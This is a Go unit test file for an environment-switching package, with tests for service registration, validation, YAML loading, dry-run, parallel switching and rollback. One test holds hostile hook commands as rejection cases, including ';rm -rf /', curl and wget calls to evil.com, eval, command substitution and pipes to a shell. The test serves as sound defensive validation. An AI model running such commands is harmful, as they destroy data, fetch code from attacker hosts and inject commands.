// Copyright (c) 2025 Archmagece
// SPDX-License-Identifier: MIT

package environment

import (
	"context"
	"testing"
)

// mockSwitcher is a mock implementation of ServiceSwitcher for testing.
type mockSwitcher struct {
	name         string
	switchCalled bool
	switchConfig interface{}
	switchError  error
	state        interface{}
}

func newMockSwitcher(name string) *mockSwitcher {
	return &mockSwitcher{
		name:  name,
		state: map[string]string{"mock": "state"},
	}
}

func (m *mockSwitcher) Name() string {
	return m.name
}

func (m *mockSwitcher) Switch(ctx context.Context, config interface{}) error {
	m.switchCalled = true
	m.switchConfig = config
	return m.switchError
}

func (m *mockSwitcher) GetCurrentState(ctx context.Context) (interface{}, error) {
	return m.state, nil
}

func (m *mockSwitcher) Rollback(ctx context.Context, previousState interface{}) error {
	return nil
}

// TestNewEnvironmentSwitcher tests the constructor.
func TestNewEnvironmentSwitcher(t *testing.T) {
	switcher := NewEnvironmentSwitcher()
	if switcher == nil {
		t.Fatal("NewEnvironmentSwitcher() returned nil")
	}

	if switcher.serviceSwitchers == nil {
		t.Error("serviceSwitchers map should be initialized")
	}
}

// TestEnvironmentSwitcher_RegisterServiceSwitcher tests service registration.
func TestEnvironmentSwitcher_RegisterServiceSwitcher(t *testing.T) {
	es := NewEnvironmentSwitcher()
	mock := newMockSwitcher("test-service")

	es.RegisterServiceSwitcher("test-service", mock)

	services := es.GetAvailableServices()
	found := false
	for _, s := range services {
		if s == "test-service" {
			found = true
			break
		}
	}

	if !found {
		t.Error("RegisterServiceSwitcher did not register the service")
	}
}

// TestEnvironmentSwitcher_Register tests the Register alias method.
func TestEnvironmentSwitcher_Register(t *testing.T) {
	es := NewEnvironmentSwitcher()
	mock := newMockSwitcher("auto-named-service")

	es.Register(mock)

	services := es.GetAvailableServices()
	found := false
	for _, s := range services {
		if s == "auto-named-service" {
			found = true
			break
		}
	}

	if !found {
		t.Error("Register did not register the service using its name")
	}
}

// TestEnvironmentSwitcher_SetProgressCallback tests callback setting.
func TestEnvironmentSwitcher_SetProgressCallback(t *testing.T) {
	es := NewEnvironmentSwitcher()

	callback := func(progress SwitchProgress) {
		// Callback function for testing
		_ = progress
	}

	es.SetProgressCallback(callback)

	if es.progressCallback == nil {
		t.Error("SetProgressCallback did not set the callback")
	}
}

// TestEnvironmentSwitcher_GetAvailableServices tests service listing.
func TestEnvironmentSwitcher_GetAvailableServices(t *testing.T) {
	es := NewEnvironmentSwitcher()

	// Initially should be empty
	services := es.GetAvailableServices()
	if len(services) != 0 {
		t.Errorf("Expected 0 services, got %d", len(services))
	}

	// Add some services
	es.Register(newMockSwitcher("service1"))
	es.Register(newMockSwitcher("service2"))
	es.Register(newMockSwitcher("service3"))

	services = es.GetAvailableServices()
	if len(services) != 3 {
		t.Errorf("Expected 3 services, got %d", len(services))
	}
}

// TestEnvironmentSwitcher_MultipleRegistrations tests overwriting registration.
func TestEnvironmentSwitcher_MultipleRegistrations(t *testing.T) {
	es := NewEnvironmentSwitcher()

	mock1 := newMockSwitcher("same-name")
	mock2 := newMockSwitcher("same-name")

	es.Register(mock1)
	es.Register(mock2)

	// Should only have 1 service (last one wins)
	services := es.GetAvailableServices()
	if len(services) != 1 {
		t.Errorf("Expected 1 service after duplicate registration, got %d", len(services))
	}
}

// TestValidateHookCommand tests hook command validation.
func TestValidateHookCommand(t *testing.T) {
	tests := []struct {
		name      string
		command   string
		wantError bool
	}{
		{
			name:      "valid simple command",
			command:   "echo hello",
			wantError: false,
		},
		{
			name:      "valid command with path",
			command:   "/usr/bin/test -f /path/to/file",
			wantError: false,
		},
		{
			name:      "empty command",
			command:   "",
			wantError: true,
		},
		{
			name:      "dangerous rm -rf",
			command:   ";rm -rf /",
			wantError: true,
		},
		{
			name:      "dangerous curl",
			command:   ";curl http://evil.com",
			wantError: true,
		},
		{
			name:      "dangerous wget",
			command:   "wget http://evil.com",
			wantError: true,
		},
		{
			name:      "dangerous sudo",
			command:   "sudo rm file",
			wantError: true,
		},
		{
			name:      "dangerous eval",
			command:   "eval $MALICIOUS",
			wantError: true,
		},
		{
			name:      "dangerous exec",
			command:   "exec malicious",
			wantError: true,
		},
		{
			name:      "dangerous backtick",
			command:   "echo `id`",
			wantError: true,
		},
		{
			name:      "dangerous command substitution",
			command:   "echo $(id)",
			wantError: true,
		},
		{
			name:      "dangerous pipe to shell",
			command:   "cat script |sh",
			wantError: true,
		},
		{
			name:      "dangerous pipe to bash",
			command:   "cat script |bash",
			wantError: true,
		},
		{
			name:      "dangerous and operator",
			command:   "true && false",
			wantError: true,
		},
		{
			name:      "dangerous or operator",
			command:   "true || false",
			wantError: true,
		},
		{
			name:      "dangerous background operator",
			command:   "sleep 100 & ",
			wantError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateHookCommand(tt.command)
			if (err != nil) != tt.wantError {
				t.Errorf("ValidateHookCommand(%q) error = %v, wantError = %v", tt.command, err, tt.wantError)
			}
		})
	}
}

// TestValidateHookCommand_TooLong tests command length validation.
func TestValidateHookCommand_TooLong(t *testing.T) {
	longCommand := make([]byte, 1001)
	for i := range longCommand {
		longCommand[i] = 'a'
	}

	err := ValidateHookCommand(string(longCommand))
	if err == nil {
		t.Error("Expected error for command exceeding 1000 characters")
	}
}

// TestEnvironment_Validate tests environment validation.
func TestEnvironment_Validate(t *testing.T) {
	tests := []struct {
		name      string
		env       Environment
		wantError bool
	}{
		{
			name: "valid environment",
			env: Environment{
				Name: "test",
				Services: map[string]ServiceConfig{
					"aws": {AWS: &AWSConfig{Profile: "default"}},
				},
			},
			wantError: false,
		},
		{
			name: "empty name",
			env: Environment{
				Name: "",
				Services: map[string]ServiceConfig{
					"aws": {},
				},
			},
			wantError: true,
		},
		{
			name: "no services",
			env: Environment{
				Name:     "test",
				Services: map[string]ServiceConfig{},
			},
			wantError: true,
		},
		{
			name: "nil services",
			env: Environment{
				Name:     "test",
				Services: nil,
			},
			wantError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.env.Validate()
			if (err != nil) != tt.wantError {
				t.Errorf("Validate() error = %v, wantError = %v", err, tt.wantError)
			}
		})
	}
}

// TestLoadEnvironment tests environment loading from YAML.
func TestLoadEnvironment(t *testing.T) {
	yamlData := []byte(`
name: test-env
description: Test environment
services:
  aws:
    aws:
      profile: test
      region: us-east-1
`)

	env, err := LoadEnvironment(yamlData)
	if err != nil {
		t.Fatalf("LoadEnvironment() error = %v", err)
	}

	if env.Name != "test-env" {
		t.Errorf("Name = %q, want %q", env.Name, "test-env")
	}

	if env.Description != "Test environment" {
		t.Errorf("Description = %q, want %q", env.Description, "Test environment")
	}
}

// TestLoadEnvironment_Invalid tests loading invalid YAML.
func TestLoadEnvironment_Invalid(t *testing.T) {
	invalidYAML := []byte(`
not: valid: yaml: here
`)

	_, err := LoadEnvironment(invalidYAML)
	if err == nil {
		t.Error("LoadEnvironment() should return error for invalid YAML")
	}
}

// TestEnvironmentSwitcher_SwitchEnvironment tests environment switching.
func TestEnvironmentSwitcher_SwitchEnvironment(t *testing.T) {
	es := NewEnvironmentSwitcher()
	awsMock := newMockSwitcher("aws")
	es.Register(awsMock)

	env := &Environment{
		Name: "test-env",
		Services: map[string]ServiceConfig{
			"aws": {
				AWS: &AWSConfig{Profile: "test", Region: "us-east-1"},
			},
		},
	}

	ctx := context.Background()
	result, err := es.SwitchEnvironment(ctx, env, SwitchOptions{})

	if err != nil {
		t.Fatalf("SwitchEnvironment() error = %v", err)
	}

	if !result.Success {
		t.Error("SwitchEnvironment() should succeed")
	}

	if !awsMock.switchCalled {
		t.Error("AWS switcher should have been called")
	}

	if len(result.SwitchedServices) != 1 {
		t.Errorf("Expected 1 switched service, got %d", len(result.SwitchedServices))
	}
}

// TestEnvironmentSwitcher_SwitchEnvironment_InvalidEnv tests switching with invalid env.
func TestEnvironmentSwitcher_SwitchEnvironment_InvalidEnv(t *testing.T) {
	es := NewEnvironmentSwitcher()

	env := &Environment{
		Name:     "",
		Services: nil,
	}

	ctx := context.Background()
	_, err := es.SwitchEnvironment(ctx, env, SwitchOptions{})

	if err == nil {
		t.Error("SwitchEnvironment() should return error for invalid environment")
	}
}

// TestEnvironmentSwitcher_SwitchEnvironment_NoSwitcher tests switching without switcher.
func TestEnvironmentSwitcher_SwitchEnvironment_NoSwitcher(t *testing.T) {
	es := NewEnvironmentSwitcher()
	// Don't register any switcher

	env := &Environment{
		Name: "test-env",
		Services: map[string]ServiceConfig{
			"aws": {
				AWS: &AWSConfig{Profile: "test"},
			},
		},
	}

	ctx := context.Background()
	_, err := es.SwitchEnvironment(ctx, env, SwitchOptions{})

	if err == nil {
		t.Error("SwitchEnvironment() should return error when no switcher registered")
	}
}

// TestEnvironmentSwitcher_SwitchEnvironment_DryRun tests dry run mode.
func TestEnvironmentSwitcher_SwitchEnvironment_DryRun(t *testing.T) {
	es := NewEnvironmentSwitcher()
	awsMock := newMockSwitcher("aws")
	es.Register(awsMock)

	env := &Environment{
		Name: "test-env",
		Services: map[string]ServiceConfig{
			"aws": {
				AWS: &AWSConfig{Profile: "test"},
			},
		},
	}

	ctx := context.Background()
	result, err := es.SwitchEnvironment(ctx, env, SwitchOptions{DryRun: true})

	if err != nil {
		t.Fatalf("SwitchEnvironment() error = %v", err)
	}

	if !result.Success {
		t.Error("DryRun should succeed")
	}

	// In dry run mode, the switcher should NOT be called
	if awsMock.switchCalled {
		t.Error("Switcher should NOT be called in dry run mode")
	}
}

// TestEnvironmentSwitcher_SwitchEnvironment_WithProgress tests progress callback.
func TestEnvironmentSwitcher_SwitchEnvironment_WithProgress(t *testing.T) {
	es := NewEnvironmentSwitcher()
	awsMock := newMockSwitcher("aws")
	es.Register(awsMock)

	progressCalled := false
	es.SetProgressCallback(func(progress SwitchProgress) {
		progressCalled = true
		if progress.TotalServices != 1 {
			t.Errorf("TotalServices = %d, want 1", progress.TotalServices)
		}
	})

	env := &Environment{
		Name: "test-env",
		Services: map[string]ServiceConfig{
			"aws": {
				AWS: &AWSConfig{Profile: "test"},
			},
		},
	}

	ctx := context.Background()
	_, err := es.SwitchEnvironment(ctx, env, SwitchOptions{})

	if err != nil {
		t.Fatalf("SwitchEnvironment() error = %v", err)
	}

	if !progressCalled {
		t.Error("Progress callback should have been called")
	}
}

// errorMockSwitcher is a mock that returns an error on Switch.
type errorMockSwitcher struct {
	name  string
	state interface{}
}

func newErrorMockSwitcher(name string) *errorMockSwitcher {
	return &errorMockSwitcher{
		name:  name,
		state: map[string]string{"mock": "state"},
	}
}

func (m *errorMockSwitcher) Name() string                                               { return m.name }
func (m *errorMockSwitcher) Switch(ctx context.Context, config interface{}) error       { return context.DeadlineExceeded }
func (m *errorMockSwitcher) GetCurrentState(ctx context.Context) (interface{}, error)   { return m.state, nil }
func (m *errorMockSwitcher) Rollback(ctx context.Context, previousState interface{}) error { return nil }

// TestEnvironmentSwitcher_SwitchEnvironment_SwitchError tests error handling.
func TestEnvironmentSwitcher_SwitchEnvironment_SwitchError(t *testing.T) {
	es := NewEnvironmentSwitcher()
	errorMock := newErrorMockSwitcher("aws")
	es.Register(errorMock)

	env := &Environment{
		Name: "test-env",
		Services: map[string]ServiceConfig{
			"aws": {
				AWS: &AWSConfig{Profile: "test"},
			},
		},
	}

	ctx := context.Background()
	result, err := es.SwitchEnvironment(ctx, env, SwitchOptions{})

	if err == nil {
		t.Error("SwitchEnvironment() should return error when switch fails")
	}

	if result.Success {
		t.Error("Result should not be successful")
	}

	if len(result.FailedServices) != 1 {
		t.Errorf("Expected 1 failed service, got %d", len(result.FailedServices))
	}
}

// TestEnvironmentSwitcher_SwitchEnvironment_Rollback tests rollback on error.
func TestEnvironmentSwitcher_SwitchEnvironment_Rollback(t *testing.T) {
	es := NewEnvironmentSwitcher()
	errorMock := newErrorMockSwitcher("aws")
	es.Register(errorMock)

	env := &Environment{
		Name: "test-env",
		Services: map[string]ServiceConfig{
			"aws": {
				AWS: &AWSConfig{Profile: "test"},
			},
		},
	}

	ctx := context.Background()
	result, _ := es.SwitchEnvironment(ctx, env, SwitchOptions{RollbackOnError: true})

	if result.RollbackPerformed {
		// Rollback may or may not be performed depending on when error occurred
		t.Log("Rollback was performed as expected")
	}
}

// TestEnvironmentSwitcher_SwitchEnvironment_MultipleServices tests multiple services.
func TestEnvironmentSwitcher_SwitchEnvironment_MultipleServices(t *testing.T) {
	es := NewEnvironmentSwitcher()
	awsMock := newMockSwitcher("aws")
	dockerMock := newMockSwitcher("docker")
	es.Register(awsMock)
	es.Register(dockerMock)

	env := &Environment{
		Name: "test-env",
		Services: map[string]ServiceConfig{
			"aws": {
				AWS: &AWSConfig{Profile: "test"},
			},
			"docker": {
				Docker: &DockerConfig{Context: "default"},
			},
		},
	}

	ctx := context.Background()
	result, err := es.SwitchEnvironment(ctx, env, SwitchOptions{})

	if err != nil {
		t.Fatalf("SwitchEnvironment() error = %v", err)
	}

	if !result.Success {
		t.Error("SwitchEnvironment() should succeed")
	}

	if len(result.SwitchedServices) != 2 {
		t.Errorf("Expected 2 switched services, got %d", len(result.SwitchedServices))
	}
}

// TestEnvironmentSwitcher_SwitchEnvironment_Parallel tests parallel switching.
func TestEnvironmentSwitcher_SwitchEnvironment_Parallel(t *testing.T) {
	es := NewEnvironmentSwitcher()
	awsMock := newMockSwitcher("aws")
	dockerMock := newMockSwitcher("docker")
	es.Register(awsMock)
	es.Register(dockerMock)

	env := &Environment{
		Name: "test-env",
		Services: map[string]ServiceConfig{
			"aws": {
				AWS: &AWSConfig{Profile: "test"},
			},
			"docker": {
				Docker: &DockerConfig{Context: "default"},
			},
		},
	}

	ctx := context.Background()
	result, err := es.SwitchEnvironment(ctx, env, SwitchOptions{Parallel: true})

	if err != nil {
		t.Fatalf("SwitchEnvironment() error = %v", err)
	}

	if !result.Success {
		t.Error("Parallel switch should succeed")
	}

	if len(result.SwitchedServices) != 2 {
		t.Errorf("Expected 2 switched services, got %d", len(result.SwitchedServices))
	}
}

// TestEnvironmentSwitcher_SwitchEnvironment_AllServiceTypes tests all service types.
func TestEnvironmentSwitcher_SwitchEnvironment_AllServiceTypes(t *testing.T) {
	es := NewEnvironmentSwitcher()
	es.Register(newMockSwitcher("aws"))
	es.Register(newMockSwitcher("gcp"))
	es.Register(newMockSwitcher("azure"))
	es.Register(newMockSwitcher("docker"))
	es.Register(newMockSwitcher("kubernetes"))
	es.Register(newMockSwitcher("ssh"))

	env := &Environment{
		Name: "test-env",
		Services: map[string]ServiceConfig{
			"aws":        {AWS: &AWSConfig{Profile: "test"}},
			"gcp":        {GCP: &GCPConfig{Project: "test-project"}},
			"azure":      {Azure: &AzureConfig{Subscription: "test-sub"}},
			"docker":     {Docker: &DockerConfig{Context: "default"}},
			"kubernetes": {Kubernetes: &KubernetesConfig{Context: "minikube"}},
			"ssh":        {SSH: &SSHConfig{Config: "~/.ssh/config"}},
		},
	}

	ctx := context.Background()
	result, err := es.SwitchEnvironment(ctx, env, SwitchOptions{})

	if err != nil {
		t.Fatalf("SwitchEnvironment() error = %v", err)
	}

	if len(result.SwitchedServices) != 6 {
		t.Errorf("Expected 6 switched services, got %d", len(result.SwitchedServices))
	}
}

// TestEnvironmentSwitcher_SwitchEnvironment_UnknownService tests unknown service type.
func TestEnvironmentSwitcher_SwitchEnvironment_UnknownService(t *testing.T) {
	es := NewEnvironmentSwitcher()
	es.Register(newMockSwitcher("unknown-service"))

	env := &Environment{
		Name: "test-env",
		Services: map[string]ServiceConfig{
			"unknown-service": {}, // No specific config
		},
	}

	ctx := context.Background()
	_, err := es.SwitchEnvironment(ctx, env, SwitchOptions{})

	if err == nil {
		t.Error("SwitchEnvironment() should return error for unknown service type")
	}
}

// TestEnvironmentSwitcher_SwitchEnvironment_NilConfig tests nil config for service.
func TestEnvironmentSwitcher_SwitchEnvironment_NilConfig(t *testing.T) {
	es := NewEnvironmentSwitcher()
	es.Register(newMockSwitcher("aws"))

	env := &Environment{
		Name: "test-env",
		Services: map[string]ServiceConfig{
			"aws": {AWS: nil}, // Nil AWS config
		},
	}

	ctx := context.Background()
	result, err := es.SwitchEnvironment(ctx, env, SwitchOptions{})

	// The implementation may handle nil config differently
	// Check that it either returns an error or fails gracefully
	if err != nil {
		t.Logf("SwitchEnvironment() returned error for nil config: %v", err)
	} else if !result.Success {
		t.Logf("SwitchEnvironment() returned failed result for nil config")
	}
	// Either outcome is acceptable for nil config
}
